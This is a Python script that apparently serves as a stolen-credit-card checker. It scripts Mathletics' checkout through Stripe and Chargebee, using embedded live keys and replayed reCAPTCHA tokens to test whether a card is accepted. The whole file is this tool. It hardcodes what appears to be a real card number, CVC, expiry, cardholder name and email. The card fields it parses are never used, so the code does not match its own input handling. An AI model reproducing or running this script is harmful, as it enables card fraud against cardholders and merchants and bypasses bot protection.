import requests
import user_agent
import time
def Tele(ccx):
		ccx=ccx.strip()
		n = ccx.split("|")[0]
		mm = ccx.split("|")[1]
		yy = ccx.split("|")[2][-2:]
		cvc = ccx.split("|")[3]
		user = str(user_agent.generate_user_agent)
		
		headers = {
		    'authority': 'parentgateway.prod.mathletics.com',
		    'accept': '*/*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/json',
		    'origin': 'https://parent.prod.eastus2.mathletics.com',
		    'referer': 'https://parent.prod.eastus2.mathletics.com/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': user,
		}
		
		json_data = {
		    'query': '\n    mutation CreatePaymentIntentFromQuote($input: CreatePaymentIntentFromQuoteInput!) {\n  intentObject: createPaymentIntentFromQuote(input: $input) {\n    paymentIntent\n  }\n}\n    ',
		    'variables': {
		        'input': {
		            'quoteId': '309297',
		            'email': 'gvvvv7277@gmail.com',
		        },
		    },
		}
		
		response = requests.post('https://parentgateway.prod.mathletics.com/graphql', headers=headers, json=json_data)
		
		oo = (response.json()['data']['intentObject']['paymentIntent'])
		st1=oo.split('id')[1]
		st2 = st1[4:]
		st3 = st2.split('",')[0]
		
		headers = {
		    'authority': 'api.stripe.com',
		    'accept': 'application/json',
		    'accept-language': 'en-US',
		    'content-type': 'application/x-www-form-urlencoded',
		    'origin': 'https://js.stripe.com',
		    'referer': 'https://js.stripe.com/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		}
		
		data = 'time_on_page=4717498&guid=fb83f278-a5da-4c63-af1a-c3e75f74a5579320a4&muid=4cc3c24a-f45d-4f04-8828-4185932d795e279d6e&sid=182c3976-7089-4c6b-a8f3-53a9ace54e743e430d&key=pk_live_51DztxdAUqY9IdtLZf2UACG37aFQEHlWblI8O1O9Gl0JJWB2P6bFdWKIOjD0qtfRxY0f6Bh0q2PkOW4D2qfUnhffl005s0TJg0v&payment_user_agent=stripe.js%2F78ef418&card[number]=5568628200696038&card[cvc]=510&card[exp_month]=07&card[exp_year]=25&card[name]=Angel+Rippin&card[address_state]=New+York&card[address_country]=USA'
		
		response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
		
		
		token = (response.json()['id'])
		
		
		
		headers = {
		    'authority': '3plearning.chargebee.com',
		    'accept': 'application/json, text/plain, */*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'authorization': 'Basic live_OLzsmwy8WJWmyoDoCwoH9YqqWwW9HTpc',
		    'content-type': 'application/x-www-form-urlencoded',
		    'origin': 'https://js.chargebee.com',
		    'referer': 'https://js.chargebee.com/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': user,
		}
		
		data = {
		    'gateway_account_id': 'gw_1vKQme9RYLOm24VTk',
		    'payment_method_type': 'card',
		    'id_at_vault': token,
		    'gw_obj_type': 'token',
		    '_jsapi_key': 'live_OLzsmwy8WJWmyoDoCwoH9YqqWwW9HTpc',
		    'recaptchaToken': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQPRaHy3EBNy45qJDP0_bCWRDZp2-NQuoC4YQypMv9UKtDoN-oaiImun-nzvS0daHmgcRQGFkle642Xai71pUsIFwpWPQJos-qS5s8mLHjqRDWeaocN1NQ9MLiRc93cg35EH4r08_uy7Fnf1V0Uec2uEGkrbNpCC3HG7fkBC4HrDfjDd1-_tIkCrDp-mo1SK2T3ug0fkTqrYHoL71FXXpVQGLOCzSW9Q7n1wdM_yyno_sDXBiTF3N8YJG3myuEkDLMV1cDYlvsrHvWnbZUB4_7CgDxV27n4fCHsHW80VR9KOAjNF_FZvbm6EW8kYG266T7h9zIPSDx100DAKI2CGhQrbsOWnH1BmRdO-yeT_kB5-hK71s1CyUYPhSjQyuzsglJK_Yej60I_W8yKKYf2rPd2KWR6anK4Gp4BoWj0TGfr2-xOK9zPxmjv_8hx9xv-kds3xFoETDujWPSbwZzTjTjZBKwYvUhy-cT854UXKKLCWeXFbTy8ql22fnF8lUqn_GxrIczPCAd2A2itQuonmVsZOqL0Jm12VBOS9ptWMWm5JimHpyDWE2R762D9JvdKe6h-MgZxOr0EarXciYyqUGJ1lZzq3XoSWEvT27R6w85nM32d3WZI1I5VsZ5IUhGVPQbRpFLS8OWIy5xfrsl4TJIWu0Zbu3FTKXMTunXp8Pn-pL9XaSzLJLlZj_ng3jxlpQPK4HH-FfXdJsjOkkqAb3w9QWpm9Klq_G7SATRDbHUOMSUR2QFW5Jgip27oHXlLATKQfJTIyMgdjnmMJz4vGMSdpI3Guwf6ktc8ajv0A2ajKaMxQ4CmRPD2cIkS7Skxg_4dQKOihYuCO7_Xc03x9vIP8u_AZ13CSeC-k7WbqEpLq-rQ8teaMYYF0zbVRNuFG2VhW7svW8_xAuNbG0YSz8we5RMqMxv6L-saTVY-j64n6WXb6U5JRkYbUMtZm4CkEO9XxjeHPqEvyT-zsQidS07R7IOiSEFzIpHxT-xGdcz2QYWEircEpQ-1CJMAEvUbDa4NU15N97qopLYaPodP-g7MZ9NfkcziKyNKhwmDrmySTtlBWoEHpXuTfDh-qsRcmtsRMRC9WCyv8ZXV2rlkc2ZHneESTVzTDd9FKWEAMw0fptyhtTtB2qqXk4YxdlH8Y3yAOHL1HWUMWLzDt2Z1IcVGVEji3lCsVvr20GsZ35Smr3HvbWmrkXFfPAW7F4qc1OGlFz7jG_YsHBf1gvVUUdSbpqQ8TVxquDuKn3jeM5jEZPIJXgADRB_iqxiAw3pcDjA_vy4kqzCgqmEN91Kay0hq7aIejZXhwzmZxZaCoc2hhcmRfaWTOMa1MgaJrcqgyZjdkYmI3NaJwZAA.nXM-SE60aE_0R1csFlpWQDG53GAP87rHEfLlKxkqtp0',
		}
		
		response = requests.post('https://3plearning.chargebee.com/api/js/v2/tokens/create_using_temp_token', headers=headers, data=data)
		
		cd = (response.json()['token']['id'])
		time.sleep(5)
		headers = {
		    'authority': '3plearning.chargebee.com',
		    'accept': 'application/json, text/plain, */*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'authorization': 'Bearer '+str(st3)+'',
		    'content-type': 'application/json',
		    'origin': 'https://js.chargebee.com',
		    'referer': 'https://js.chargebee.com/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': user,
		    'x-requested-with': 'XMLHttpRequest',
		}
		
		json_data = {
		    'cardBillingAddress': {
		        'firstName': 'Angel',
		        'lastName': 'Rippin',
		        'state': 'New York',
		        'countryCode': 'USA',
		    },
		    'billingAddress': {
		        'firstName': 'Angel',
		        'lastName': 'Rippin',
		        'state': 'New York',
		        'countryCode': 'USA',
		    },
		    'plan': 'mathletics-1-month-subscription-with-trial---usd-mbcv2.0',
		    'customer': {
		        'email': 'gvvvv7277@gmail.com',
		    },
		    'cbToken': cd,
		    'reattempt': True,
		    'recaptchaToken': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQPQ_NY5k7nI5m9IitTXeP07ip8haBOux8eMlxJ1qX0OUw32N1tLzsytbOcvBkfZN0yiN3BN7FcXwqxAmd8IiyLZwJ3z0jSI2MBGmPVf4hrKozyI0Es3g_RPOs3_8YYbdpTudUGpSXskopAMrWolXO6mi-OQJTFZKE7SlnlSchXTP79O79CpG6jdNgRkVFv7t3yua_5MvtU3nPFVwcWZgCEgNpFC92NRTehmhQaJva6fWO0P0u6mYDUjkdnw8sjh2ADfKHy54PWMJaDldTM4fwJDuXvX0J_T4PYz8CkcDkzKpkzL5o7RXcA-MINd87YjHx6_Jb7WweAIhK2s-n8Fx_R6GfmfHAu7vRApLDqYf0i-b1d_ygjbp7odG4eylbm43Gx8FEKNHKfxScjhkIDDUQs7YQiM_-EZ9CVtxkEFEJh5iJttBk5RM9osSw3UAwuUmaw-pDKszRL_Zm51AQs0BH_RSm52w7iKPmgViUahhrzPhKjoB8YaAQ4mevtZKPirW9B7QtNWglqoZOj8nb7HDU98508TlEiIUckvQ_3muU8gGOsHhTzW9ayHrv0U6L2ICLXejNVR9OdX3_xZGrBsNCHR-ByiXI4D6S0TaDGCKUmyaQDldX4m8zTJZbhsW_DEmz_SKQcEmGkmTF7yWdm5nR184XiafvQKRvBXxpHceB4MyEWlLsxbNwrmDmH6Qtnp_t491ZyG3SjTVKYs741dbMJUvIBlV9BbJ-DvWMBHLrnajT3cAjMni5HhNEJKzTBt829-V61kF2VRF_wfSNBUB5z8wBZX0f6v6a7xuzBDvmaKfr4-QnbxZ6LnT52jDhQgivyb6qsv6ohpUvWB5EOLR_O2t2RTmCwrZAJMQzssWiJWRMXO72APYSktfDf97laM0uR8bRWJ987YG-KLkbYqkca1emZd1Uicr6iDQba1_wFZh4Eht2A5IsbVBwlMs7H_h78RJxA0Qiw231ps6nyglR48xhst4mPVxmRCmYkXEL6UT2XQ6Io4I5XsCySE4GlQKO6n_rY86KIZtYnRVLj8uaDQOetKcN7DqJO10_uyStSGGaqkw2qdBK21wiPPuq9etloWBIYeR2yfP-IMWz1xYxpaY57eMVrnh3VhD7ns3xV02PPR5B8NElKubEyKVeE_wm_DF6RuUWiVAjJONcRFhdCUv52xiuZpMK4DVSzqQSZi1ol9iV0xneD7LytHmdVX4h2CGAZ3Kn5Hx8N_TrwMSeHZjhrQOcmlINliLEXDLq4vJDt4F1e8Ho2Ef6KSDO_vl5F_x5lwtQSOJHdwLfLRcITjhaNleHDOZnFlo6hzaGFyZF9pZM4xrUyBomtyqDQ3YmNkNmRlonBkAA.w81JLpv8bmNgzwNQZRmuSLMSwV2DXhNfkNF5bRTMY3A',
		}
		
		response = requests.post(
		    'https://3plearning.chargebee.com/api/internal/payment_intents/confirm',
		    headers=headers,
		    json=json_data,
		)
		time.sleep(5)
		try:
			ii=(response.text)
		except:
			return 'error'
		return ii
	
